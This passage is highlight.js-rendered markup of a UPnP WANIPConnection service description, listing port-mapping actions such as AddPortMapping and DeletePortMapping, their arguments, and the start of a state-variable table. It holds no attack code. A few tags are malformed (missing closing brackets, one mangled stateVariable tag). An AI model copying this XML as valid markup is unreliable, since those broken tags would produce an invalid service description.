class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>Uptime<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetNATRSIPStatus<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRSIPAvailable<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RSIPAvailable<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewNATEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>NATEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetGenericPortMappingEntry<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPortMappingIndex<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingNumberOfEntries<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        &lt;/argument​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetSpecificPortMappingEntry<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in&lt;/direction​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>AddPortMapping<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewInternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>InternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>DeletePortMapping<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetExternalIPAddress<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewExternalIPAddress<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ExternalIPAddress<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">actionList</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">serviceStateTable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>IP_Routed<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;yes&quot;</span></span><span class="hljs-tag">​      &lt;<span class="hljs-attr">name</span>&gt;</span>PossibleConnectionTypes<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Unconfigured<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>IP_Routed<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>IP_Bridged<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ConnectionStatus<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>Unconfigured<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Unconfigured<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Connecting<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Connected<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>PendingDisconnect<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Disconnecting<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>Disconnected<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Uptime<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui4<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>LastConnectionError<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>ERROR_NONE<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>ERROR_NONE<span 